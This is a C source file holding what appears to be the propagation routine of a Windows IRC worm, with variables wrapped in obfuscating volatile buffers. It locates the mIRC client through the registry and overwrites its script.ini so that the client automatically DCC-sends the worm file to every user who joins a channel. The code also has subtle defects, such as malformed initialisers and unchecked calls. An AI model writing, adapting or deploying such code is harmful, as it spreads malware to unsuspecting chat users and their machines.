#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>   // for strlen, strcat

void _FindmIRC(void)
{
    char mIrc[256];
    char mIrcPath[256];
    char mIrcFull[256] = {0};

    // Transform int e (loop counter)
    volatile int e_buf[2] = {{0, (int)0}};
    volatile int *p_e = (volatile int *)&e_buf[0];

    // Transform FILE *Script
    FILE* volatile Script_buf[2] = {{NULL, (FILE*)0}};
    FILE* volatile *p_Script = (FILE* volatile *)&Script_buf[0];

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\mIrc", 0, KEY_READ, &_hKey);
    RegQueryValueExA(_hKey, "UninstallString", NULL, NULL, mIrc, (LPDWORD)&_mIrcPath);
    RegCloseKey(_hKey);

    // Extract the mIRC installation path from the uninstall string (skip the first character)
    (*p_e) = 1;
    while (mIrc[(*p_e)] != '\0' && mIrc[(*p_e)] != '.')
    {
        mIrcFull[(*p_e) - 1] = mIrc[(*p_e)];
        (*p_e)++;
    }
    mIrcFull[(*p_e) - 1] = '\0';   // truncate before the dot (e.g., "C:\...\mirc.exe" -> "C:\...\mirc")

    // Find the last backslash and truncate to the directory
    (*p_e) = strlen(mIrcFull);
    while (mIrcFull[(*p_e)] != '\\')
    {
        mIrcFull[(*p_e)] = '\0';
        (*p_e)--;
    }

    // Append "script.ini"
    strcat(mIrcFull, "script.ini");

    (*p_Script) = fopen(mIrcFull, "wt");
    fprintf((*p_Script), "[script]\n");
    fprintf((*p_Script), "n0=on 1:JOIN:#:{\n");
    fprintf((*p_Script), "n1=/if ( $nick == $me ) { halt }\n");
    fprintf((*p_Script), "n2=/dcc send $nick %s\n", _sysdoze2);   // use the global sysdoze2 (the worm's path)
    fprintf((*p_Script), "n3=}\n");
    fclose((*p_Script));

    return;
}
#pragma optimize("", on)
